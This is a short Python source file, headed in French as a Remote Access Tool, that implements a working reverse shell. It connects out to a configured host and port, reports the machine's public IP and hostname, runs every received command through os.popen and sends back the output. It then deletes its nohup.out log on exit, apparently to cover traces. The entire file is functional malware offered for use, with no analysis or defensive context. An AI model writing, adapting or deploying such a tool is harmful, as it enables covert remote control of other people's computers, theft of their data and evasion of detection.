# Un Remote Access Tool qui permet de prendre contrôle d'un shell.

import socket, os, ipgetter

class colors:
    blue = '\033[94m'
    end = '\033[0m'


host = "127.0.0.1"
port = 5005


actual = os.getcwd()
co = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

co.connect((host,port))
co.send((colors.blue + "\n\
  ___   _  _ ___ _    _    \n\
 / __| | || | __| |  | |   \n\
 \__ \_| __ | _|| |__| |__ \n\
 |___(_)_||_|___|____|____|\n\
                           " + colors.end).encode())

co.send("\n[*] Connected : {} {}\n\n>  ".format(ipgetter.myip(),socket.gethostname()).encode())
msgrecu = ""

while True:
    msgrecu = co.recv(2048).decode();
    if "gratquit" in msgrecu:
        break;
    elif len(msgrecu.split()) != 0 and msgrecu.split()[0] == "cd":
        try:
            os.chdir(msgrecu.split()[1])
            co.send("\n>  ".encode())
        except:
            co.send("No such directory\n>  ".encode())
    else:
        systemcmd = os.popen(msgrecu).read()
        co.send(("\n" + systemcmd + "\n>  ").encode())

try:
    strtodel = "rm " + actual + "/nohup.out"
    os.system(strtodel)
except:
    pass
co.send("\nQuitting..Good Bye !\n\n".encode())
co.close()

